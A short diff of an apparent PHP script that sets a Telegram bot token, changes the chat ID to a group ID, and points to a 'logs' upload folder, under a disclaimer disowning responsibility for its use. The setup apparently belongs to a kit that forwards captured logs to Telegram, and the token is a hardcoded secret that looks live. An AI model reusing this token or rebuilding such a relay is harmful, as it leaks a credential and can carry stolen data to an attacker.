@@ -5,7 +5,7 @@
 	!WARNING! ALL CODE IS FOR INTRODUCTORY PURPOSES WE ARE NOT RESPONSIBLE FOR WHAT YOU HAVE DONE !WARNING!
 */
 define('BOT_TOKEN', '7457251638:AAHVFfJyMCxeCvZvqK0cOFoRBjPRoyM1tWY'); // Replace YOUR TELEGRAM BOT TOKEN to Your BotToken
-define('CHAT_ID', '7457251638'); // Replace YOUR CHAT ID to Your Chat ID
+define('CHAT_ID', '-1002254994707'); // Replace YOUR CHAT ID to Your Chat ID
 
 $uploadPath = __DIR__ . '/logs/';
 
